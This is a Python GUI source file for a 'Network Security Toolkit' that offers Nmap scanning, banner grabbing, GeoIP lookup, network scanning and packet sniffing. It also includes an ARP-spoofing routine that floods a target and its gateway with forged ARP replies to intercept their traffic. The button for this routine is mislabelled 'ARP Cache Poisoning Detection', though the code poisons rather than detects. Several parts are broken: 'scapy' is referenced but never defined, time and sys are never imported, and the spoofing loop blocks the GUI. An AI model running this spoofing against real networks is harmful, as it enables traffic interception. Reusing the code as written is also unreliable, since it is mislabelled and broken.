import tkinter as tk
import customtkinter as ctk
from scapy.all import *
import socket

#Importing custom modules for various network security tasks
import banner_grabber #banner_grabber(target, port)
import nmapscan #scan(target) 
import geoip #get_loc(url, path, file)
import wifiscanner #wifi(ip_add_range_entered)
import packet_sniff #packet(count)

mode = "light" # Setting the appearance mode for CustomTkinter

# Function to change the appearance mode between light and dark
def change():
    global mode
    if  mode == "dark":
        ctk.set_appearance_mode("light")
        mode="light"
    else:
        ctk.set_appearance_mode("dark")
        mode="dark"

# Function to perform an Nmap scan on a given target
def scanmap():

    # Creating a new window for the Nmap scan
    window = ctk.CTkToplevel(app)
    window.title("Nmap Scan")
    window.geometry("300x250")
    window.resizable(False, False)

    # Function to perform an Nmap scan on a domain
    def domain():
        try:
            ans.insert('end', text="Scanning...\n\n") # Displaying a message to indicate that the scan is in progress
            get = ctk.CTkInputDialog(text="Enter domain: ", title="Nmap Scan") 
            target = socket.gethostbyname(get.get_input()) # Getting the IP address of the domain
            out = nmapscan.scan(target) # Performing the Nmap scan
            ans.insert('end', text=out+ "\n\n") # Displaying the results of the scan
        except Exception as e:
            ans.insert('end', text="Please enter a valid domain.\n\n") # Displaying an error message if the domain is invalid
    
    # Function to perform an Nmap scan on an IP address
    def ipaddr():
        try:
            ans.insert('end', text="Scanning...\n\n") # Displaying a message to indicate that the scan is in progress
            get = ctk.CTkInputDialog(text="Enter an IP: ", title="Nmap Scan")
            target = get.get_input() # Getting the IP address from the user
            out = nmapscan.scan(target) # Performing the Nmap scan
            ans.insert('end', text=out + "\n\n") # Displaying the results of the scan
        except Exception as e:
            ans.insert('end', text="Please enter a valid IP.\n\n") # Displaying an error message if the IP address is invalid

    # Creating a button to perform an Nmap scan on a domain
    dom = ctk.CTkButton(window, text="Enter a domain: ", command=domain)
    dom.place(x=150, y=50, anchor="center")

    # Creating a button to perform an Nmap scan on an IP address
    ip = ctk.CTkButton(window, text="Enter an IP: ", command=ipaddr)
    ip.place(x=150, y=100, anchor="center")

# Function to grab banners from services on a given target
def get_ban():
    # Creating a new window for the banner grabber
    window = ctk.CTkToplevel(app)
    window.title("Banner Grabber")
    window.geometry("300x250")
    window.resizable(False, False)

    # Function to grab a banner from a domain
    def domain():
        try:
            ans.insert('end', text="Grabbing...\n\n")  # Displaying a message to indicate that the banner is being grabbed
            get0 = ctk.CTkInputDialog(text="Enter url: ", title="Banner Grabber") 
            url = socket.gethostbyname(get0.get_input()) # Getting the IP address of the domain
            get1 = ctk.CTkInputDialog(text="Enter port: ", title="Banner Grabber")
            port = get1.get_input() # Getting the port number from the user
            out = banner_grabber.banner_grabber(url, int(port)) # Grabbing the banner
            ans.insert('end', text=out+ "\n\n") # Displaying the grabbed banner
        except Exception as e:
            ans.insert('end', text="Please enter a valid url and port.\n\n") # Displaying an error message if the domain or port is invalid
   
    # Function to grab a banner from an IP address
    def ipaddr():
        try:
            ans.insert('end', text="Grabbing...\n\n") # Displaying a message to indicate that the banner is being grabbed
            get0 = ctk.CTkInputDialog(text="Enter IP: ", title="Banner Grabber")
            ip = get0.get_input() # Getting the IP address from the user
            get1 = ctk.CTkInputDialog(text="Enter port: ", title="Banner Grabber")
            port = get1.get_input() # Getting the port number from the user
            out = banner_grabber.banner_grabber(ip, int(port)) # Grabbing the banner
            ans.insert('end', text=out+ "\n\n") # Displaying the grabbed banner
        except Exception as e:
            ans.insert('end', text="Please enter a valid ip and port.\n\n") # Displaying an error message if the IP address or port is invalid

    # Creating a button to grab a banner from a domain        
    dom = ctk.CTkButton(window, text="Enter domain: ", command=domain)
    dom.place(x=150, y=100, anchor="center")

    # Creating a button to grab a banner from an IP address
    ip = ctk.CTkButton(window, text="Enter IP: ", command=ipaddr)
    ip.place(x=150, y=150, anchor="center")

def arp_spoofing_main():
    # ARP Spoofing GUI and logic...
    arp_spoof_process = None  # Global variable to hold the ARP spoofing process

    def open_arp_spoofing_window():
        nonlocal arp_spoof_process

        arp_window = tk.Toplevel(app)
        arp_window.title("ARP Spoofing")
        arp_window.geometry("480x350")

        def spoof_arp(output_text):
            nonlocal arp_spoof_process
            target_ip = target_entry.get()
            gateway_ip = gateway_entry.get()
            try:
                while True:
                    spoof(target_ip, gateway_ip, output_text)
                    spoof(gateway_ip, target_ip, output_text)
                    time.sleep(2)
                    output_text.insert(tk.END, "[+] Packets sent\n")
                    output_text.see(tk.END)
                    if arp_spoof_process is None:
                        break
            except KeyboardInterrupt:
                output_text.insert(tk.END, "\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
                output_text.see(tk.END)
                sys.exit(0)

        def stop_spoofing():
            nonlocal arp_spoof_process
            arp_spoof_process = None

        target_label = tk.Label(arp_window, text="Target IP Address (example: 192.168.1.254):")
        target_label.grid(row=0, column=0, padx=10, pady=5)
        target_entry = tk.Entry(arp_window)
        target_entry.grid(row=0, column=1, padx=10, pady=5)

        gateway_label = tk.Label(arp_window, text="Gateway IP Address (example: 192.168.1.254):")
        gateway_label.grid(row=1, column=0, padx=10, pady=5)
        gateway_entry = tk.Entry(arp_window)
        gateway_entry.grid(row=1, column=1, padx=10, pady=5)

        output_text = tk.Text(arp_window, height=10, width=55)
        output_text.grid(row=2, column=0, columnspan=2, padx=10, pady=5)

        spoof_button = tk.Button(arp_window, text="Start ARP Spoofing", command=lambda: spoof_arp(output_text))
        spoof_button.grid(row=3, column=0, columnspan=2, pady=10)

        exit_button = tk.Button(arp_window, text="Stop", command=stop_spoofing)
        exit_button.grid(row=4, column=0, columnspan=2, pady=10)

    def spoof(target_ip, spoof_ip, output_text):
        target_mac = get_mac(target_ip)
        if target_mac:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
        else:
            output_text.insert(tk.END, f"[-] Failed to get target MAC address for {target_ip}\n")
            output_text.see(tk.END)

    def get_mac(ip):
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet/arp_packet
        answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            return None

    open_arp_spoofing_window()

# Function to get location information for a given IP address
def get_loc():
    
    # Creating a new window for the geoip module   
    window = ctk.CTkToplevel(app)
    window.title("GeoIP")
    window.geometry("300x250")
    window.resizable(False, False)

    # Function to get location information for a domain
    def domain():
        try:
            ans.insert('end', text="Locating...\n\n") # Displaying a message to indicate that the location information is being retrieved
            get = ctk.CTkInputDialog(text="Enter url: ", title="GeoIP")
            url = get.get_input()  # Getting the IP address of the domain
            out = geoip.get_loc(url, path.get(), file.get()) # Getting the location information
            ans.insert('end', text=out+ "\n\n") # Displaying the location information
        except Exception as e:
            ans.insert('end', text="Please enter a valid url.\n\n") # Displaying an error message if the domain is invalid

    # Function to get location information for an IP address
    
    # Creating a button to get location information for a domain
    pathlabel = ctk.CTkLabel(window, text="Enter path for location saving: ")
    pathlabel.place(x=150, y=50, anchor="center")
    path = ctk.CTkEntry(window, placeholder_text="Enter path", width=200)
    path.place(x=150, y=75, anchor="center")

    filelabel = ctk.CTkLabel(window, text="Enter name of the file:")
    filelabel.place(x=150, y=125, anchor="center")
    file = ctk.CTkEntry(window, placeholder_text="Enter file-name", width=200)
    file.place(x=150, y=150, anchor="center")

    #Creating a button to get location information for an IP address
    dom = ctk.CTkButton(window, text="GeoIP ", command=domain)
    dom.place(x=150, y=200, anchor="center")

# Function to scan Wi-Fi networks    
def wifiscan():

    # Creating a new window for the Wi-Fi scanner
    window = ctk.CTkToplevel(app)
    window.title("Wifi Scanner")
    window.geometry("300x250")
    window.resizable(False, False)

    # Function to scan Wi-Fi networks
    def domain():
        try:
            ans.insert('end', text="Scanning...\n\n")  # Displayinga message to indicate that the scan is in progress
            out = wifiscanner.wifi(range.get()) # Performing the Wi-Fi scan
            ans.insert('end', text=out+"\n\n") # Displaying the results of the scan
        except Exception as e:
            ans.insert('end', text="Please enter valid ip range.\n\n")

    # Creating a button to scan Wi-Fi networks
    iplabel = ctk.CTkLabel(window, text="Enter ip range: ")
    iplabel.place(x=150, y=50, anchor="center")
    range = ctk.CTkEntry(window, placeholder_text="192.168.155.0/24", width=200)
    range.place(x=150, y=100, anchor="center")
    dom = ctk.CTkButton(window, text="Wifi Scanner", command=domain)
    dom.place(x=150, y=150, anchor="center")

# Function to sniff packets on a network
def sniff():

    # Creating a new window for the packet sniffer
    window = ctk.CTkToplevel(app)
    window.title("Packet Sniffer")
    window.geometry("300x250")
    window.resizable(False, False)

    # Function to sniff packets on a network
    def domain():
        try:
            ans.insert('end', "Sniffing...\n\n")  # Displaying a message to indicate that the packets are being sniffed
            out = packet_sniff.packet(int(count.get())) # Performing the packet sniff
            ans.insert('end', text=out+"\n\n") # Displaying the sniffed packets
        except Exception as e:
            ans.insert('end', text="Please enter valid number.\n\n")

    # Creating a button to sniff packets on a network
    countlabel = ctk.CTkLabel(window, text="Enter number of packets to be sniffed: ")
    countlabel.place(x=150, y=50, anchor="center")
    count = ctk.CTkEntry(window, placeholder_text="Enter number", width=200)
    count.place(x=150, y=100, anchor="center")
    dom = ctk.CTkButton(window, text="Packet Sniffer", command=domain)
    dom.place(x=150, y=150, anchor="center")

def clear():
    ans.delete(0.0, 'end')

# Creating a button to change the appearance mode
ctk.set_appearance_mode(mode)
ctk.set_default_color_theme("blue.json")

# Creating the main window for the application
app = ctk.CTk()
app.geometry("720x600")
app.resizable(False, False)

app.title("Network Security Toolkit")

# Creating a button to perform an Nmap scan
mode = ctk.CTkButton(app, text="Switch", command=change)
mode.place(x=600, y= 50, anchor="center")

title = ctk.CTkLabel(app, text="Select Application", font= ("Times New Roman", 25))
title.place(x=350, y=100, anchor="center")

# Creating a button to perform an Nmap scan
nmaps = ctk.CTkButton(app, text="Nmap Scaning", command=scanmap)
nmaps.place(x=150, y=200, anchor="center")

# Creating a button to grab banners from services on a target
ban = ctk.CTkButton(app, text="Banner Grabing", command=get_ban)
ban.place(x=350, y=300, anchor="center")

 #Creating a button to get location information for a given IP address
loc = ctk.CTkButton(app, text="ARP Cache Poisoning Detection", command=arp_spoofing_main)
loc.place(x=550, y=200, anchor="center")

# Creating a button to get location information for a given IP address
loc = ctk.CTkButton(app, text="GeoIP", command=get_loc)
loc.place(x=550, y=300, anchor="center")

# Creating a button to scan Wi-Fi networks
wifi = ctk.CTkButton(app, text="Wifi Scaning", command=wifiscan)
wifi.place(x=350, y=200, anchor="center")

# Creating a button to sniff packets on a network
pack = ctk.CTkButton(app, text="Packet Sniffing", command=sniff)
pack.place(x=150, y=300, anchor="center")

# Creating a text box to display the results of various tasks
ans = ctk.CTkTextbox(app, width=300, height=200,)
ans.place(x=225, y=475, anchor="center")

clear_out = ctk.CTkButton(app, text="Clear", command=clear)
clear_out.place(x=500, y=450, anchor="center")

quit = ctk.CTkButton(app, text="Quit", command=app.quit)
quit.place(x=500, y=500, anchor="center")

# Running the application
app.mainloop()